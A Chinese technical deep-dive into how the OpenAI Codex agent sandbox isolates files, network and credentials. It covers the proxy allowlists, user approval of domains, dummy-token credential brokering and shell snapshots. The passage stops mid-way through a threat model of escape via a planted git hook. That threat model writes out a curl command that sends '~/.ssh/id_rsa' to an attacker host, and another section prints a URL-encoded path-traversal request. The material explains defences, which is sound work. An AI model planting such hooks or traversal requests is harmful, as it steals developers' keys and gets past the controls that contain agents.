# OpenAI Codex 沙箱机制：配置模型、跨平台内核隔离与网络生命周期

> **核心公理**: $$\text{Harness} = \text{Agent} - \text{Model}$$
> 在 Agent Harness 工程中，沙箱（Sandboxing）是保护宿主环境不受失控或恶意代码破坏的底线物理防线。大模型仅负责生成意图与命令，所有的外部调用、文件操作与网络请求均被严格囚禁在操作系统内核级外壳内。

---

## 🧩 0. 认知基准：Sandbox四维隔离模型 vs Agent Sandbox生产深水区

在构建或评估不可信代码执行环境时，业界通常使用**四维隔离模型**来抽象操作系统的防爆边界；然而，当沙箱应用于 **自主智能体（Autonomous Agent）** 这一特定工程场景时，由于大模型需要**自主联网安装依赖、读写工作区源码、执行编译构建**，通用的隔离模型会迅速撞上复杂的工程反模式与安全暗礁。

### 0.1 通用理论抽象：沙箱的四维隔离模型

在经典系统安全中，沙箱被划分为四个正交的防护维度：

![沙箱的四维隔离模型](../assets/sandbox_4d_isolation_model.png)

1. **文件隔离**：限定可读范围，限定可写目录，防止未授权遍历或破坏宿主磁盘。
2. **网络策略**：允许必要连接，拦截未授权访问，切断恶意流量出入。
3. **进程空间**：隔离进程可见范围，限制特权提升与系统调用能力。
4. **资源限额**：约束 CPU、内存、磁盘以及进程数与执行时长，防止拒绝服务（DoS）。

这一抽象模型清晰明了，构成了理解沙箱技术的入门基准。

---

### 0.2 工程范式跃迁：走向 Agent 生产深水区

然而，**不可信的大模型生成代码并非普通的恶意样本分析**——Agent 拥有合法的“改代码”与“联外网”诉求。如果直接照搬通用模型的字面限制（如简单地将“写入封闭在工程目录之内”或“切断网络杜绝外泄”），将导致沙箱直接被击穿或完全丧失可用性。

为了应对这一矛盾，工业级 Agent 执行环境（以 OpenAI Codex 为代表）必须从**“被动隔离限制”**跃迁至**“零信任动态治理与中继”**的生产深水区：

![Agent 执行沙箱的四维深水区模型](../assets/sandbox_agent_deep_water.png)

#### 四维深水区的工程对齐与认知跃迁

| 隔离维度 | 表面层次（经典理论抽象） | 生产深水区（Agent Harness 真实落地） | 深度逆向解析 / 认知进度 |
| :--- | :--- | :--- | :--- |
| **① 文件隔离** | 限定可读 / 限定可写在工程目录内 | **元数据动态抠洞（Carveouts）+ 防 Git Hook 提权**：<br/>• 强制把 `.git`/`.codex` 等关键配置重挂为只读；<br/>• 内核级 `deny file-write-unlink` 锁死父目录，封死重命名改名逃逸。 | ✅ **已消化掌握**（详见本文第 5 节） |
| **② 网络策略** | 允许必要连接 / 拦截未授权访问 | **Credential Broker 零机密中继 + SSRF 实时探针**：<br/>• 沙箱环境变量仅注入等长 Dummy Token（Secret Zero），出站透明替换；<br/>• 异步探针比对 RFC 全保留网段，双阶段复核封死 DNS Rebinding。 | ✅ **已消化掌握**（详见本文第 4 节、第 6 节） |
| **③ 进程空间** | 隔离进程可见范围 / 限制权限 | **【待深入验证 ❓】特权剥夺与进程生命周期管控**：<br/>• 待验证：大模型脚本执行 sudo/setuid 时，OS 如何在内核级切断提权？<br/>• 待验证：不可信子进程后台常驻或失控时，Harness 如何确保全量回收进程树？ | ❓ **认知前沿待探索**（见文末第 7 节地标） |
| **④ 资源限额** | CPU · 内存 · 磁盘 · 进程时长 | **【待深入验证 ❓】无 cgroups 环境下的资源护栏**：<br/>• 待验证：本地原生沙箱缺乏硬件级 cgroups 配额，如何防范 CPU/内存 DoS？<br/>• 待验证：除单次命令超时熔断与输出截断外，宿主是否还有更多防护？ | ❓ **认知前沿待探索**（见文末第 7 节地标） |

```
💡 核心安全公理：
  1. Harness = Agent - Model （外壳接管不可信模型的所有物理动作）
  2. Sandbox Secret Level = Secret Zero （沙箱内部机密为零，凭证可用但不可见）
  3. Writable Workspace = Project \ Protected Metadata （工作区写权限强制抠除受保护元数据）
```

---

## 🗺️ 1. 沙箱配置模型与权限编译

Codex 提供了**粗粒度模式**与**细粒度权限配置文件（Permission Profiles）**两套配置机制，并严格遵循“默认封闭（Fail-Closed）”的零信任原则。

### 1.1 粗粒度模式：`SandboxMode`

在 `codex-rs/protocol/src/config_types.rs` 中定义了三种基础模式：

```rust
pub enum SandboxMode {
    #[default]
    ReadOnly,          // 全局只读，默认禁止出站网络
    WorkspaceWrite,    // 默认授予根目录读取权限；写入限于工作区、按配置开放的临时目录及额外授权目录，受保护路径除外
    DangerFullAccess,  // 完全禁用沙箱，拥有宿主当前用户的完整权限
}
```

针对 `WorkspaceWrite`，可通过 `[sandbox_workspace_write]` 进行参数调整（如 `writable_roots` 额外白名单目录、`network_access` 是否放行外部网络、是否排除 `/tmp` 等）。

### 1.2 细粒度权限配置：`[permissions]` 体系

在 `config.toml` 中，Codex 支持通过声明式的 Profile 实现细粒度控制，支持单继承（`extends`）机制：

```toml
[permissions.secure-dev]
description = "Restricted dev profile"
extends = ":workspace"

[permissions.secure-dev.filesystem]
glob_scan_max_depth = 3

[permissions.secure-dev.filesystem.":workspace_roots"]
"**/*.env" = "deny"
"credentials.json" = "deny"
"build/**" = "write"

[permissions.secure-dev.network.domains]
"api.openai.com" = "allow"
"*.github.com"   = "allow"
```

### 1.3 零配置（Zero-Config）冷启动真相

很多人误以为 Codex 启动时本地一定预置了一份默认的 `config.toml` 并自带一份默认放行的域名清单。深入源码（`config/src/loader/mod.rs` 与 `network-proxy/src/config.rs`）可还原以下一手工程事实：

1. `**config.toml` 默认不存在**：
  - 首次安装和启动 Codex 时，`~/.codex/config.toml` 并不存在（测试断言 `assert!(!codex_home.path().join("config.toml").exists())`）。
  - 配置加载器捕获 `NotFound` 错误后**优雅降级为空表（Empty Table）**，系统平滑运行。
2. **没有任何预置的公网域名白名单**：
  - 内存默认模型中 `NetworkProxyConfig.domains = None`。
  - 当 `allowed_domains` 为空时，网络代理默认将所有出站网络判定为 `NotAllowed`，**100% 拦截并挂起**，绝不预设信任。

---

## 🛡️ 2. 跨平台操作系统沙箱引擎

Codex 在 `codex-rs/sandboxing` 中抽象了 `SandboxManager`，将抽象的执行需求转译为具体操作系统的内核调用机制。

```mermaid
graph TD
    classDef mac fill:#e1f5fe,stroke:#0288d1,stroke-width:2px;
    classDef linux fill:#e8f8f5,stroke:#26a69a,stroke-width:2px;
    classDef win fill:#fff3e0,stroke:#e65100,stroke-width:2px;

    REQ["执行请求 (SandboxTransformRequest)"]
    MGR["SandboxManager 调度中枢"]
    
    REQ --> MGR
    MGR -->|"macOS"| MAC["Apple Seatbelt (/usr/bin/sandbox-exec)<br/>SBPL 规则引擎"]:::mac
    MGR -->|"Linux"| LNX["Bubblewrap (bwrap) + Seccomp<br/>Namespaces + UDS 路由桥"]:::linux
    MGR -->|"Windows"| WIN["Restricted Token / Elevated Service<br/>受限令牌与私有桌面"]:::win
```



### 2.1 macOS 引擎：Apple Seatbelt

- **系统调用加固**：使用绝对路径 `/usr/bin/sandbox-exec` 运行（防止 `PATH` 环境变量劫持）。
- **默认关闭**：加载 `seatbelt_base_policy.sbpl`，起点规则为 `(deny default)`。
- **网络限制（小孔原则）**：在 `seatbelt.rs` 动态生成的 SBPL 规则中，仅放行向宿主机 Loopback 代理端口的出站连接：
  ```lisp
  (allow network-outbound (remote ip "localhost:{port}"))
  ```
  沙箱内若试图向任何公网 IP 发起直连 TCP Socket，直接被 macOS 内核以 `EPERM` 拦截。

### 2.2 Linux 引擎：Bubblewrap + 跨命名空间中继网桥

在 Linux 上，无法照搬 macOS 的做法。

#### 为什么 Linux 不能直接连 `127.0.0.1` 代理端口？

- Linux 下 Codex 启用 **Network Namespace (`--unshare-net`)** 实现内核级网络隔离。
- 一旦进入独立的网络命名空间，沙箱内只有独立的虚拟 `lo` 网卡，**与宿主机的 `127.0.0.1` 在物理上互不相通**。

#### Codex 的跨命名空间中继黑科技（`proxy_routing.rs`）

为了让隔离 NetNS 内的进程连上宿主机的 `codex-network-proxy`，Codex 设计了一套基于 **文件描述符（FD）跨命名空间传递** 的 **TCP $\to$ UDS $\to$ TCP** 网桥：

```mermaid
sequenceDiagram
    autonumber
    participant HostBridge as 宿主机 Host Bridge Worker
    participant Sandbox as 沙箱进程 (bwrap --unshare-net)
    participant Proxy as 宿主机 codex-network-proxy

    Note over HostBridge,Sandbox: 1. 进入沙箱前：通过 UnixStream::pair() 建立控制信道
    Sandbox->>Sandbox: 2. 隔离 NetNS 内激活 lo，并在随机端口 bind() 生成 TcpListener
    Sandbox->>HostBridge: 3. 通过 UDS 经由 SCM_RIGHTS 将该 Listener 的 FD 传给宿主进程
    Note over HostBridge: 4. 关键：Socket 的 NetNS 绑定在创建瞬间。宿主进程调用 accept() 监听的正是沙箱内流量！
    Sandbox->>Sandbox: 5. 重写环境变量 HTTP_PROXY=http://127.0.0.1:{沙箱随机端口}
    Sandbox->>Sandbox: 6. 应用 PR_SET_NO_NEW_PRIVS + Seccomp 封死后续新建 socket
    
    Note over Sandbox,Proxy: 双向中继通信
    Sandbox->>HostBridge: curl 发起请求 -> 命中沙箱内监听端口
    HostBridge->>Proxy: 宿主 Bridge 连接真实代理端口 (注入 Attribution Token 鉴权)
    Proxy-->>HostBridge: 校验通过并处理请求
    HostBridge-->>Sandbox: 双向转发数据
```



---

## 🌐 3. 网络沙箱完整生命周期与白名单治理

网络沙箱的实际运行并非静态规则，而是一个由 **“初始阻断 $\to$ 人工审批 $\to$ 动态扩充 $\to$ 稳态放行”** 构成的两阶段演进闭环。

### 3.1 完整流程图

在真实系统中，流程区分**阶段 A（冷启动无白名单）与阶段 B（动态积累后的稳态）**：

```mermaid
graph TD
    classDef start fill:#f5f5f5,stroke:#616161,stroke-width:2px;
    classDef decision fill:#fff3e0,stroke:#e65100,stroke-width:2px;
    classDef allow fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px;
    classDef deny fill:#ffebee,stroke:#c62828,stroke-width:2px;
    classDef dynamic fill:#e3f2fd,stroke:#1565c0,stroke-width:2px;

    REQ["沙箱内工具发起外联<br/>(例如 curl https://api.github.com)"]:::start
    PROXY["到达宿主 codex-network-proxy"]:::start
    CHECK{"本地白名单是否存在且命中？"}:::decision
    
    FAST["直接放行 (Decision: Allow)"]:::allow
    OUTBOUND["由宿主机真实网卡出站请求<br/>(向公网目标建立 TCP/TLS)"]:::allow
    
    BLOCK["判定为 NotAllowed (未授权)"]:::deny
    SUSPEND["挂起连接 (tokio 异步暂停)"]:::decision
    APPROVAL["触发 AskForApproval 审批流程<br/>(弹出 NetworkAccess 确认卡片)"]:::decision
    
    USER_DECIDE{"用户是否批准？"}:::decision
    KILL["切断连接<br/>(返回 HTTP 403 / TCP RST)"]:::deny
    
    EXPAND["★ 动态扩充白名单 ★<br/>1. proxy.add_allowed_domain<br/>2. 写入规则库 (ExecPolicy 持久化)"]:::dynamic
    RESUME["唤醒挂起的连接"]:::dynamic

    REQ --> PROXY
    PROXY --> CHECK
    CHECK -->|"已在白名单中 (稳态通道)"| FAST
    FAST --> OUTBOUND
    
    CHECK -->|"无白名单 / 未命中 (冷启动初始状态必定走这里)"| BLOCK
    BLOCK --> SUSPEND
    SUSPEND --> APPROVAL
    APPROVAL --> USER_DECIDE
    
    USER_DECIDE -->|"拒绝 / 超时"| KILL
    USER_DECIDE -->|"允许"| EXPAND
    EXPAND --> RESUME
    RESUME --> OUTBOUND
```



---

### 3.2 白名单的配置语法与规则

域名白名单核心解析逻辑位于 `codex-rs/network-proxy/src/policy.rs`，支持严格的 Hostname 语法规范：

```toml
[permissions.workspace.network.domains]
"api.openai.com"    = "allow"   # 1. 精确匹配
"*.github.com"      = "allow"   # 2. 单星通配符 (Subdomains Only)
"**.huggingface.co" = "allow"   # 3. 双星通配符 (Apex + Subdomains)
"api?.example.com"  = "allow"   # 4. 单字符通配符
"127.0.0.1"         = "allow"   # 5. IP 字面量 (本地/私有 IP 需显式声明)
"evil.example"      = "deny"    # 6. 显式黑名单 (Deny)
```

1. **精确匹配（Exact）**：如 `"api.openai.com"`，只匹配该完整主机名，不匹配顶级域名 `openai.com` 也不匹配三级子域名。
2. **单星通配（`*.`）**：如 `"*.github.com"`，仅匹配严格子域名（如 `api.github.com`、`raw.github.com`），**明确排除**顶层域名 `github.com` 本身。
3. **双星通配（`**/*.`）**：如 `"**.huggingface.co"`，**同时匹配**顶层域名 `huggingface.co` 及其任意层级的所有子域名。
4. **单字符问号（`?`）**：如 `"api?.example.com"`，匹配单一字符（例如 `api1.example.com`）。
5. **IP 字面量与本地回环限制**：
  - 私有网络与回环地址（`127.0.0.1`、`localhost`、`10.x.x.x`）出于安全防护默认禁止，即使配置了通配符也无法放行；
  - 必须在配置中**显式书写精确的 IP 字面量或 `localhost`** 才能允许。
6. **Deny 优先原则**：
  - `Deny` 规则的优先级绝对高于 `Allow`。如果目标主机同时命中了允许规则与拒绝规则，一律判定为阻断。

---

### 3.3 动态白名单：会话内追加与持久化

白名单不是一成不变的死规则。当模型执行命令试图访问未经授权的新域名时，系统通过审批机制实现动态演进：

1. **挂起与弹窗确认**：
    代理层截获到不在白名单中的请求时，将连接挂起，向用户前端弹出 `ApprovalAction::NetworkAccess` 审批卡片（展示目标域名、端口及请求协议）。
2. **内存级即时放行（`proxy.add_allowed_domain`）**：
    用户点击允许后，核心层调用 `proxy.add_allowed_domain(&host)`：
  - 代理将新主机名插入运行时的 `allow_set` 并重新编译 `GlobSet`；
  - 正在挂起的 TCP/TLS 连接被唤醒，立即建立连接出站。
3. **规则库持久化（`ExecPolicy`）**：
    系统通过 `exec_policy.append_network_rule_and_update(...)` 将该审批放行决策持久化保存至工作区规则文件（`.codex/`）：
  - 该域名正式沉淀为该项目的长期合规白名单；
  - 后续同一域名再次访问时，直接命中白名单进入稳态免审批通道。

---

### 3.4 并发与锁治理：多线程访问相同域名不同内容的处理

在实际软件构建中，沙箱进程经常会并发向同一个域名发起对**不同资源路径（Path）**的网络请求（例如并发执行 `curl https://api.github.com/repos` 与 `curl https://api.github.com/user`，或者多线程构建下载依赖）。

Codex 在 `codex-rs/core/src/tools/network_approval.rs` 中设计了一套极其精妙的 **Singleflight 锁与去重机制**，避免并发连接导致审批弹窗风暴：

```mermaid
sequenceDiagram
    autonumber
    participant T1 as 线程 1 (访问 /repos)
    participant T2 as 线程 2 (访问 /user)
    participant Service as NetworkApprovalService
    participant UI as 用户界面 (AskForApproval)

    Note over T1,T2: 并发发起对 api.github.com 的不同请求
    T1->>Service: 1. 请求接入 (解析为 HostApprovalKey)
    T2->>Service: 1. 请求接入 (解析为相同 HostApprovalKey)
    
    Service->>Service: 2. get_or_create_pending_approval
    Note over Service: 判定：T1 先到达成为 Owner (is_owner=true)<br/>T2 拿到相同的 PendingApproval (is_owner=false)
    
    T1->>UI: 3. T1 触发真实的弹窗卡片 ("允许访问 api.github.com?")
    T2->>T2: 4. T2 调用 wait_for_decision().await 挂起监听 Notify
    
    UI-->>T1: 5. 用户点击批准 (Allow)
    T1->>Service: 6. T1 设置决策并触发 notify.notify_waiters()
    Service-->>T2: 7. 全局广播唤醒 T2！
    
    Note over T1,T2: 两条连接同时获批，各自通过宿主代理向远端传输真实数据
```



#### 关键锁与并发设计细节：

1. **域名粒度归一化（`HostApprovalKey`）**：
    审批与权限锁定的最小颗粒度是 **Host（协议 + 主机名 + 端口 + 环境 ID）**，**而不是具体的 URL 路径**。
   因此，无论沙箱内多线程访问同一域名下的什么不同资源路径，在核心调度层都被归一化为同一个审批键：
2. **会话缓存快速路径锁（`session_policy_commit_lock`）**：
    服务首先在轻量锁内检查 `session_approved_hosts`。如果之前该会话已经批准过该 Host，则无需进入审批流程，直接返回 `NetworkDecision::Allow` 放行。
3. **Leader / Follower 竞态去重（Singleflight）**：
    针对首次并发访问未授权域名，通过内部互斥锁管理 `pending_host_approvals`：
  - **Leader (Owner)**：第一个抢到锁的线程成为 `is_owner = true`，负责组装审批上下文向用户弹出唯一的审批卡片；
  - **Follower**：后到达的并发线程拿到同一个 `Arc<PendingHostApproval>`，直接进入异步等待。
4. **单次批准全局广播唤醒（`tokio::sync::Notify`）**：
    `PendingHostApproval` 内部基于 `SyncOnceLock` 与 `Notify` 构建：
   当用户在前端点击批准后，Owner 线程执行 `set_decision(decision)` 并调用 `self.notify.notify_waiters()`。所有挂起的 Follower 线程瞬间被全部唤醒，共享该放行决策，各自继续完成后续的网络通信。
   **核心价值**：即便并发打来数十个网络请求，用户也仅会收到一次审批卡片，体验平滑且无并发冲突。

---

## 🔑 4. 凭据隔离机制：Credential Broker 与零机密沙箱

在 Agent 执行环境中，大模型编写的代码通常需要调用外部授权服务（如 `git push` 到 GitHub、调用内部模型 API 网关等）。如果简单地将 `GITHUB_TOKEN` 或 `OPENAI_API_KEY` 明文注入到沙箱的环境变量中，将带来极其致命的安全漏洞：大模型生成的不可信代码（或第三方 npm/pip 恶意依赖）只需一行 `printenv` 或 `cat` 即可彻底窃取机密。

为了解决这一矛盾，Codex 在 `network-proxy` 模块中实现了 **Credential Broker（凭证中继与代理治理系统）**，其核心安全公理是：
$$\text{Sandbox Secret Level} = \text{Secret Zero}$$
**“子进程可用但不可见（Usable but Invisible）”**：沙箱内部的进程全程只能接触到无权限的**虚拟替身凭据（Dummy Token）**；真实的机密仅保存在宿主机受控进程内存中，在流量经由本地网络代理出站时，由代理透明完成请求头的校验与真实凭据注入。

### 4.1 全流程闭环架构

Credential Broker 形成了覆盖**环境虚拟化 $\to$ 沙箱隔离执行 $\to$ 延迟探针拦截 $\to$ 防穿透校验 $\to$ 动态凭据注入**的完整闭环：

```mermaid
sequenceDiagram
    autonumber
    participant Host as 宿主环境 (Codex Core)
    participant Broker as Credential Broker 引擎
    participant Sandbox as 沙箱子进程 (Untrusted Code)
    participant Proxy as 本地网络代理 (codex-network-proxy)
    participant Upstream as 上游目标服务器 (api.github.com)

    Note over Host,Broker: 1. 启动前：凭证虚拟化
    Host->>Broker: 传入真实环境变量 (含真实 Token)
    Broker->>Broker: 生成形状保持的 Dummy Token，替换环境变量与别名
    Broker->>Host: 注入 CODEX_NETWORK_PROXY_CREDENTIAL_BROKER_ACTIVE="1"
    
    Note over Host,Sandbox: 2. 隔离执行
    Host->>Sandbox: 启动受限沙箱进程 (仅持有 Dummy Token)
    Sandbox->>Sandbox: 执行命令 (如 curl -H "Authorization: Bearer ghp_xxx" ...)
    
    Note over Sandbox,Proxy: 3. 强制代理与协议探针
    Sandbox->>Proxy: 经由 HTTP/SOCKS 代理发出请求
    Proxy->>Proxy: peek_protocol 探针：预读 5 字节判定 TLS/HTTP
    Proxy->>Proxy: is_safe_for_authorization 审计：防路径穿越混淆
    Proxy->>Proxy: select_credentials 匹配：将 Dummy 替换为 Real Token
    
    Note over Proxy,Upstream: 4. 真实凭据出站
    Proxy->>Upstream: 携带真实 Authorization 报文头请求
    Upstream-->>Proxy: 返回正常业务响应 (200 OK)
    Proxy-->>Sandbox: 透传业务数据
```

---

### 4.2 核心机制与一手工程细节

#### 1. 形状保持的替身生成（Shape-Preserving Dummy Token）
如果代理简单地将凭据替换为随机的 UUID 或无意义字符串，沙箱内的 CLI 工具（如 `gh`）或各类官方 SDK 会在向外发包前先执行本地正则表达式或长度校验，导致客户端在沙箱内直接报错崩溃。

在 `credential_broker/providers.rs` 中，Codex 实现了 `shaped_dummy_value` 机制：
- **前缀保持**：严格保持原始前缀（如 `ghp_`、`github_pat_`、`sk-proj-`）；
- **绝对等长**：生成的 Dummy Token 字符长度与真实 Token 完全一致；
- **字符位置映射**：如果在真实 Token 的特定索引位置存在非字母数字的分隔字符，Dummy Token 会在完全相同的索引位置保留这些符号，其余位置填充随机字符。

#### 2. 双轨 Provider 体系
系统支持内置与自定义两套凭证提供者模型：
- **内置 Provider（Built-in）**：
  - **GitHub**：覆盖 `GH_TOKEN`、`GITHUB_TOKEN`、`GH_ENTERPRISE_TOKEN`；绑定 `api.github.com`、`github.com`、`*.ghe.com`，并根据 `GH_HOST` 动态计算私有企业版域名。
  - **OpenAI**：覆盖 `OPENAI_API_KEY`，前缀识别 `sk-proj-`、`sk-svcacct-`（排除 `sk-ant-` 等竞品）；结合 `OPENAI_BASE_URL` 动态绑定私有网关。
- **声明式可配置 Provider（Configured）**：
  在 `config.toml` 中通过 `[features.network_proxy.credential_providers]` 声明：
  ```toml
  [features.network_proxy.credential_providers.my_service]
  env = ["MY_API_KEY"]
  patterns = ["mykey_[a-zA-Z0-9]{32}"]
  url_prefixes = ["https://api.my-corp.internal/v1/"]
  auth = ["bearer"]
  ```
  代理层支持 `bearer`、`token`、`basic`、`header` 四种认证格式。

#### 3. 环境变量与全文字符串虚拟化（Virtualization & Aliases）
真实项目中，Token 常被拼接进复杂字符串（如 `DATABASE_URL=postgres://user:TOKEN@host/db`）或赋给自定义别名。
- `matching.rs` 和 `replacement.rs` 会递归扫描环境变量全文字符串，将嵌入的凭据子串全量替换为 Dummy Token，并建立别名映射记录（`CredentialAlias`）。
- **本地回环回退（Local Binding Bypass）**：当请求目标为本地回环（`127.0.0.1` / `localhost`）且启用了 `allow_local_binding = true` 时，由于流量并不经过外部代理出口，Broker 会智能将该连接相关的真实凭证回退恢复，避免打断本地开发与 Mock 测试。

#### 4. 延迟解密与协议探针（Protocol Peeking）
对所有经过 CONNECT 隧道的流量强行执行 TLS MITM 解密会破坏 SSH over Proxy 或长连接非 HTTP 协议。
Codex 在 `brokered_tunnel.rs` 中设计了 `peek_protocol` 探针：
- 当目标主机匹配已登记的凭证目标时，代理状态机被标记为 `HostMitmRequirement::Credential`；
- 建立隧道后，代理设置 250ms 超时**预读前 5 个字节**：
  - 若匹配 TLS 握手报文头（`0x16 0x03`）：激活 TLS 解密管线；
  - 若解析出标准 HTTP 请求行（`GET ... HTTP/1.1`）：转入 HTTP 解密；
  - 若为其它未识别的 TCP 字节流或发生超时：降级为**透明转发（Opaque Forwarding）**，绝不破坏现有非 HTTP 通信。

#### 5. 请求防篡改与路径混淆防御（Path Traversal & Parser Differential）
在 Agent 安全模型中，**沙箱代码属于完全不可信代码（Untrusted）**。如果系统只做简单的 URL 前缀白名单匹配（如仅授权访问只读端点 `https://api.corp/v1/public/`），恶意代码可能会利用 URL 编码与相对路径穿越构造请求：
$$\text{GET } /v1/public/\%2e\%2e/admin/delete\_user$$

如果代理只按字符串前缀判断，误以为是合规路径而注入了高权凭据，而上游服务器（如 Nginx/Go）在接收到请求后执行了 URL 解码与路径折叠（Fold），就会导致高权凭据在敏感接口上被滥用。

在 `authorization_path.rs` 中，Codex 实现了严格的防护：
1. **原始线缆路径一致性对比**：比较原始网络包上的 `raw_path` 与解析后的 `request.path()`，凡是检测到编码差异直接拒绝注入；
2. **`is_safe_for_authorization` 逐段字符审计**：拆解 URL 路径分段，拒绝任何包含 `.`、`..`、`\`、`%2e%2e`、`%2f`、`%252e`（双重编码）等具有“向上逃逸”特征的畸形分段；
3. **Fail-Closed（默认拒绝）**：一旦路径判定不安全，代理立刻放弃凭据注入，保留 Dummy Token 原样发往上游，上游服务器因校验 Dummy Token 失败返回 `401 Unauthorized`，彻底切断越权风险。

#### 6. Shell 快照与凭证治理（Shell Snapshot Integration）

在命令行工具调度中，Codex 引入了 Shell 快照（Shell Snapshot）机制以消除频繁冷启动的性能开销，同时由 `SnapshotCredentialBroker` 对快照全生命周期实施严格的机密清洗，确保“提速”与“零泄露”二者兼得。

##### 6.1 为什么做 Shell 快照：沙箱冷启动瓶颈与瞬发优化

**1. 业务痛点：为什么不能直接使用裸 Shell（`/bin/sh -c`）？**
在开发者的真实电脑中，大量关键工具并非位于操作系统预置的系统路径中：
- Homebrew 安装的工具链（如最新版 Git）位于 `/opt/homebrew/bin`；
- 版本管理器（`nvm` 管理的 Node.js、`pyenv` 管理的 Python）高度依赖动态 Shell 函数与 Shims；
- 用户的快捷命令与自定义环境（如 `alias gs='git status'`、`GIT_SSH_COMMAND`）。

为了让 Agent 在沙箱内拥有与用户日常终端完全一致的命令执行能力，常规设计必须使用**登录交互式 Shell（Login Shell）**，即每次执行都拉起：
```bash
zsh -lc "git status"
```

**2. 沙箱内的冷启动放大效应（Sandbox Amplification）：**
`zsh -lc` 每次启动都会从磁盘逐个读取 `/etc/zshenv`、`/etc/zprofile`、`~/.zshrc`，并递归加载 Oh-My-Zsh 插件目录（解析上百个语法高亮、自动补全脚本）以及执行 `brew shellenv` 派生子进程。
- **宿主机开销**：冷启动通常需要 **500ms ~ 1500ms**。
- **沙箱级数级恶化**：在 macOS Seatbelt 或 Linux Landlock 进程沙箱内，每一个配置小文件的 `open`/`stat` 系统调用和进程衍生都会触发内核安全规则的逐次拦截鉴权，导致每次启动耗时被拖慢至 **1.5 ~ 2 秒以上**。
- **Agent 工具调用的灾难**：像 `ls` 或 `git status` 这类核心逻辑仅需 **3 ~ 5 毫秒** 的极简命令，在沙箱中 99% 以上的时间都在等待 Shell 的空转冷启动。Agent 若连续调用多次检查环境，将产生长达十几秒的卡顿。

**3. 快照提速核心逻辑：**
既然用户的 Shell 环境配置在短期内是相对静态的，Codex 的思路是**“在沙箱内仅跑一次动态解析并拍照固化，后续命令全量跳过初始化”**：
- **常规冷启动**：`[Shell 冷启动 1500ms] + [git status 5ms] = 1505ms`
- **快照瞬间启动**：`[裸机启动 1ms] + [加载快照 2ms] + [git status 5ms] = 8ms`（**性能提升接近 200 倍**）

---

##### 6.2 Credential Broker 如何做 Shell 快照与“凭证治理”

为了在享受极速快照的同时坚守沙箱的“零机密（Secret Zero）”公理，Codex 构建了贯穿快照生命周期的治理闭环：

**1. 严格在沙箱内部执行快照探针（Sandbox-Scoped Probing）：**
快照并非在宿主机无防护环境下捕获，而是由 `run_script_with_timeout` 在受控沙箱（`ShellSnapshotSandbox`）内执行。这一设计确保了：
- **路径与权限一致性**：快照内捕获的文件路径完全吻合沙箱策略（Seatbelt/Landlock）的实际可读边界；
- **防范恶意配置**：即使用户的 `~/.zshrc` 中包含第三方不可信脚本，其执行依然受沙箱权限锁死；
- **网络代理绑定**：探针运行期间的所有网络尝试均受 `codex-network-proxy` 接管。

**2. 四维完整的快照内容捕获（`CapturedSnapshot`）：**
Codex 在 `shell_snapshot_capture.rs` 中设计了内建探针脚本，不仅捕获环境变量，还固化了无形但关键的内存状态：
- **Functions（函数声明）**：通过 `declare -f`（Bash）或 `functions`（Zsh）完整抓取内存函数体（如 `nvm`、`pyenv` 实质上全为 Shell 函数而非二进制文件）；
- **Aliases（别名系统）**：通过 `alias -L` 提取别名映射；
- **Setopts / Shopt（Shell 模式）**：固化当前的选项标志（如 `setopt AUTO_CD`）；
- **Exports（导出变量）**：提取最终计算展开的 `PATH` 及环境键值对。

**3. 捕获期脱敏与磁盘机密归零（Secret Zero on Disk）：**
如果将探针结果直接序列化写盘，用户配置在 `.bashrc`/`.zshrc` 中的私有 Token（如 `export GITHUB_TOKEN="ghp_xxx"`）就会作为明文固化在磁盘快照文件（`~/.codex/snapshots/{session_id}.{nonce}.sh`）中，形成持久化漏洞。
- `SnapshotCredentialBroker` 在写入磁盘前强制介入：
  - 调用 `apply_to_env_for_snapshot` 解析识别所有受管机密；
  - 调用 `virtualize_brokered_text` 对抓取到的函数体、别名以及复合文本进行全文扫描，**将其中包含的所有真实凭据原地清洗为形状保持的 Dummy Token**。
- 最终写入磁盘的快照文件**绝无任何明文真实机密**。

**4. 运行期命令包装与极速重放（Wrapping Mechanism）：**
当 Agent 下发 `zsh -lc "git status"` 时，Codex 在 `maybe_wrap_shell_lc_with_snapshot` 中将其底层改写：
```bash
zsh -fc "if . '~/.codex/snapshots/session-1.sh' >/dev/null 2>&1; then :; fi; git status"
```
- **`-f` 参数（NO_RCS）**：强制 Zsh 严禁去读 `/etc/zshrc` 与 `~/.zshrc`，实现 **1 毫秒裸机启动**；
- **`. snapshot.sh`**：单文件顺序读取，直接将预先算好的函数、别名与已虚拟化的 Dummy Token 注入当前进程内存（耗时约 **2 毫秒**）；
- **执行目标命令**：环境齐备，立即执行 `git status`。若执行涉及外部接口调用（如后续的 `git push`），则由本地网络代理自动将请求头中的 Dummy Token 还原为真实 Token。

**5. 版本联动失效机制（Config Revision Invalidation）：**
快照文件与凭证代理策略深度绑定（记录 `broker_config_revision`）：
```rust
pub(crate) fn is_brokered_for(&self, policy: &ShellEnvironmentPolicy) -> bool {
    self.credentials.as_ref().is_some_and(|credentials| {
        &credentials.shell_environment_policy == policy
            && credentials.broker_config_revision
                == credentials.network_proxy.credential_broker_config_revision()
    })
}
```
一旦用户修改了网络配置、新增了自定义凭据提供者或轮换了密钥，`broker_config_revision` 自动递增。现有的 Shell 快照会被标记为过期并安全清理，促使下一次命令执行时自动在沙箱内重新生成干净合规的新快照。

---

## 🛡️ 5. 文件系统隔离：元数据硬阻断（Carveouts）与防提权逃逸

在编写代码场景中，Agent 必须拥有当前工作区目录的写权限（`WritableRoot`）才能正常创建和修改源码。然而，工作区并非普通纯文本目录，其内部通常包含极其敏感的版本控制与配置元数据（如 `.git`、`.codex`、`.agents`）。如果简单地将整个目录全量开放写入，将引发致命的**宿主机持久化逃逸与时间差提权**。

### 5.1 威胁建模：Git Hook 提权与配置篡改

#### 1. 攻击原理：“沙箱内埋雷，宿主机引爆”
Git 自带的自动化挂钩（如 `.git/hooks/pre-commit`）会在用户执行 `git commit` 时由操作系统静默调用执行。
当不可信的沙箱代码（或第三方恶意依赖包）试图突破隔离时，往往不需要在沙箱内强攻操作系统内核，而是采用**时间差提权与逃逸**：

```mermaid
sequenceDiagram
    autonumber
    participant Sandbox as 沙箱内不可信代码 (受限环境)
    participant Disk as 本地项目磁盘 (.git/hooks/pre-commit)
    participant HostUser as 开发者 (宿主机常规终端 / 完整特权)
    participant Attacker as 远端黑客服务器

    Note over Sandbox,Disk: 1. 沙箱内埋雷 (不可信进程)
    Sandbox->>Disk: 篡改 pre-commit: "curl -d @~/.ssh/id_rsa https://attacker.com/keys"
    Note over Sandbox: 沙箱内断网且受限，脚本暂不触发/无法外联

